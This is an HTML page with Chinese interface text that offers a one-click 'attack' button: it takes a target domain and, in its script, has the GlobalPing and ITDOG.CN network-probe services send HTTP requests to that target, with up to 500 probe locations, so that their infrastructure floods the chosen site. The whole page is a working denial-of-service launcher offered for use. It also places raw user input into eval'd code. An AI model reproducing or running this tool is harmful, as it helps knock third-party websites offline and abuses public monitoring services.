<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
  </head>
  <body>
    目标地址(要求 HTTPS 访问，不带协议和 "/"): <input type="text" id="targrt" /><br />
    <button onclick="onClick()" text="Fire!">开始攻击(查看控制台获取结果)</button><br />
    <noscript>抱歉，你的浏览器不支持 JavaScript!</noscript>

    <script>
function onClick() {
  var t = document.getElementById("targrt").value;
  eval(
    `fetch("https://api.globalping.io/v1/measurements",{headers:{accept:"*/*","accept-language":"zh-TW,zh;q=0.9,en;q=0.8","cache-control":"no-cache","content-type":"application/json"},body:'{"type":"http","target":"${t}","measurementOptions":{"protocol":"HTTP","request":{"method":"GET","query":"?1"}},"locations":[],"inProgressUpdates":true,"limit":500}',method:"POST",mode:"cors",credentials:"omit"});`
  ); // GlobalPing
  eval(
    `fetch("https://www.itdog.cn/http/",{headers:{accept:"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","accept-language":"zh-CN,zh;q=0.9,en;q=0.8","cache-control":"no-cache","content-type":"application/x-www-form-urlencoded"},referrer:"https://www.itdog.cn/http/",referrerPolicy:"strict-origin-when-cross-origin",body:"line=&host=https%3A%2F%2F${t}&host_s=${t}&check_mode=fast&ipv4=&method=get&referer=&ua=AGAgent%2F1.3&cookies=",method:"POST",mode:"cors",credentials:"include"});`
  ); // ITDOG.CN
}
    </script>
  </body>
</html>
